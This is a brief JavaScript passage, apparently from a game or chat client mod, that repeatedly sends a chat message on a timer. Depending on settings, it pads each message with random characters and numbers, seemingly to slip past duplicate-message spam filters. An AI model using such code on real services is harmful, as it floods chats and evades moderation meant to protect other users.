if(sp1)Server.sendChat(Shadow.randChar() + " " + text + " " + Shadow.randChar());
if(sp2)Server.sendChat(Shadow.randNum() + " " + text + " " + Shadow.randNum());
if(sp3)Server.sendChat(Shadow.randChar() + Shadow.randNum() + " " + text + " " + Shadow.randNum() + Shadow.randChar());
}
eval(rptask2())
} //0.001 sec, 1000 mili, centi 0.01
}), stime)
}
}))
}
rptask2()
